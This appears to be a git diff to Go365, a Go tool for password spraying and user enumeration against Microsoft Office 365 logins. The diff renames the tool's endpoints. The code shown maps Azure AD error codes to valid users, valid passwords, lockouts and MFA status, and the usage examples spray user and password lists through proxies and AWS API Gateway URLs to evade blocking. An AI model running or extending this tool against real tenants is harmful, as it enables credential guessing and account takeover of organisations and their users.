@@ -113,12 +113,12 @@ const (
                                 : Print xml response
 
  Examples:
-  ./Go365 -endpoint msol -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
-  ./Go365 -endpoint login -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5
-  ./Go365 -endpoint msol -up ./userpass_list.txt -delay 3600 -d pwnthisfakedomain.com -w 5 -o Go365output.txt
-  ./Go365 -endpoint login -u legituser -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
-  ./Go365 -endpoint msol -u legituser -pl ./pass_list.txt -delay 1800 -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
-  ./Go365 -endpoint login -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login 
+  ./Go365 -endpoint rst -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
+  ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5
+  ./Go365 -endpoint rst -up ./userpass_list.txt -delay 3600 -d pwnthisfakedomain.com -w 5 -o Go365output.txt
+  ./Go365 -endpoint graph -u legituser -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
+  ./Go365 -endpoint rst -u legituser -pl ./pass_list.txt -delay 1800 -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
+  ./Go365 -endpoint graph -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login 
   `
 	banner = `
   ██████         ██████   ██████  ██████
@@ -160,7 +160,7 @@ type flagVars struct {
 }
 func flagOptions() *flagVars {
 	flagHelp := flag.Bool("h", false, "")
-	flagEndpoint := flag.String("endpoint", "msol", "")
+	flagEndpoint := flag.String("endpoint", "rst", "")
 	flagUsername := flag.String("u", "", "")
 	flagUsernameFile := flag.String("ul", "", "")
 	flagDomain := flag.String("d", "", "")
@@ -245,37 +245,37 @@ func doTheStuffGraph(un string, pw string, prox string) (string, color.Attribute
 	x := fmt.Sprintf("%v", jsonErrCode)
 
 	if strings.Contains(x, "50059") {
-		fmt.Println(color.RedString("[login] [-] Domain not found in o365 directory. Exiting..."))
+		fmt.Println(color.RedString("[graph] [-] Domain not found in o365 directory. Exiting..."))
 		os.Exit(0) // no need to continue if the domain isn't found
 	} else if strings.Contains(x, "50034") {
-		returnString = "[login] [-] User not found: " + un
+		returnString = "[graph] [-] User not found: " + un
 		returnColor = color.FgRed
 	} else if strings.Contains(x, "50126") {
-		returnString = "[login] [-] Valid user, but invalid password: " + un + " : " + pw
+		returnString = "[graph] [-] Valid user, but invalid password: " + un + " : " + pw
 		returnColor = color.FgYellow
 	} else if strings.Contains(x, "50055") {
-		returnString = "[login] [!] Valid user, expired password: " + un + " : " + pw
+		returnString = "[graph] [!] Valid user, expired password: " + un + " : " + pw
 		returnColor = color.FgMagenta
 	} else if strings.Contains(x, "50056") {
-		returnString = "[login] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
+		returnString = "[graph] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
 		returnColor = color.FgYellow
 	} else if strings.Contains(x, "50053") {
-		returnString = "[login] [-] Account locked out: " + un
+		returnString = "[graph] [-] Account locked out: " + un
 		returnColor = color.FgMagenta
 	} else if strings.Contains(x, "50057") {
-		returnString = "[login] [-] Account disabled: " + un
+		returnString = "[graph] [-] Account disabled: " + un
 		returnColor = color.FgMagenta
 	} else if strings.Contains(x, "50076") || strings.Contains(x, "50079") {
-		returnString = "[login] [+] Possible valid login, MFA required. " + un + " : " + pw
+		returnString = "[graph] [+] Possible valid login, MFA required. " + un + " : " + pw
 		returnColor = color.FgGreen
 	} else if strings.Contains(x, "53004") {
-		returnString = "[login] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
+		returnString = "[graph] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
 		returnColor = color.FgGreen
 	} else if strings.Contains(x, "") {
-		returnString = "[login] [+] Possible valid login! " + un + " : " + pw
+		returnString = "[graph] [+] Possible valid login! " + un + " : " + pw
 		returnColor = color.FgGreen
 	} else {
-		returnString = "[login] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
+		returnString = "[graph] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
 		returnColor = color.FgMagenta
 	}
 	if debug {
@@ -334,38 +334,38 @@ func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) 
      // looks for the "psf:text" field within the XML response 
 	x := xmlResponse.FindElement("//psf:text")
 	if x == nil {
-		returnString = color.GreenString("[msol] [+] Possible valid login! " + un + " : " + pw)
+		returnString = color.GreenString("[rst] [+] Possible valid login! " + un + " : " + pw)
 		// if the "psf:text" field doesn't exist, that means no AADSTS error code was returned indicating a valid login
 	} else if strings.Contains(x.Text(), "AADSTS50059") {
 		// if the domain is not in the directory then exit 
-		fmt.Println(color.RedString("[msol] [-] Domain not found in o365 directory. Exiting..."))
+		fmt.Println(color.RedString("[rst] [-] Domain not found in o365 directory. Exiting..."))
 		os.Exit(0) // no need to continue if the domain isn't found
 	} else if strings.Contains(x.Text(), "AADSTS50034") {
-		returnString = "[msol] [-] User not found: " + un
+		returnString = "[rst] [-] User not found: " + un
 		returnColor = color.FgRed
 	} else if strings.Contains(x.Text(), "AADSTS50126") {
-		returnString = "[msol] [-] Valid user, but invalid password: " + un + " : " + pw
+		returnString = "[rst] [-] Valid user, but invalid password: " + un + " : " + pw
 		returnColor = color.FgYellow
 	} else if strings.Contains(x.Text(), "AADSTS50055") {
-		returnString = "[msol] [!] Valid user, expired password: " + un + " : " + pw
+		returnString = "[rst] [!] Valid user, expired password: " + un + " : " + pw
 		returnColor = color.FgMagenta
 	} else if strings.Contains(x.Text(), "AADSTS50056") {
-		returnString = "[msol] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
+		returnString = "[rst] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
 		returnColor = color.FgYellow
 	} else if strings.Contains(x.Text(), "AADSTS50053") {
-		returnString = "[msol] [-] Account locked out: " + un
+		returnString = "[rst] [-] Account locked out: " + un
 		returnColor = color.FgMagenta
 	} else if strings.Contains(x.Text(), "AADSTS50057") {
-		returnString = "[msol] [-] Account disabled: " + un
+		returnString = "[rst] [-] Account disabled: " + un
 		returnColor = color.FgMagenta
 	} else if strings.Contains(x.Text(), "AADSTS50076") || strings.Contains(x.Text(), "AADSTS50079") {
-		returnString = "[msol] [+] Possible valid login, MFA required. " + un + " : " + pw
+		returnString = "[rst] [+] Possible valid login, MFA required. " + un + " : " + pw
 		returnColor = color.FgGreen
 	} else if strings.Contains(x.Text(), "AADSTS53004") {
-		returnString = "[msol] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
+		returnString = "[rst] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
 		returnColor = color.FgGreen
 	} else {
-		returnString = "[msol] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
+		returnString = "[rst] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
 		returnColor = color.FgMagenta
 	}
 	if debug {
@@ -524,13 +524,13 @@ func main() {
 	}
 	// -endpoint
 	if opt.flagEndpoint == "rst"{
-		fmt.Println("Using the classic flavor of go365...")
-		fmt.Println("If you're using an AWS Gateway, make sure it is pointing to https://login.microsoftonline.com/rst2.srf")
+		fmt.Println("Using the rst endpoint...")
+		fmt.Println("If you're using an AWS Gateway (recommended), make sure it is pointing to https://login.microsoftonline.com/rst2.srf")
 		targetURL = targetURLrst2
 	} else if opt.flagEndpoint == "graph" {
 		targetURL = targetURLgraph
-		fmt.Println("using login.microsoft.com")
-		fmt.Println("If you're using an AWS Gateway, make sure it is pointing to https://login.microsoft.com/common/oauth2/token ")
+		fmt.Println("using the graph endpoint...")
+		fmt.Println("If you're using an AWS Gateway (recommended), make sure it is pointing to https://login.microsoft.com/common/oauth2/token ")
 	} else {
 		fmt.Println("Specify an endpoint (-endpoint rst, or -endpoint graph")
 		fmt.Printf("%s\n", usage)
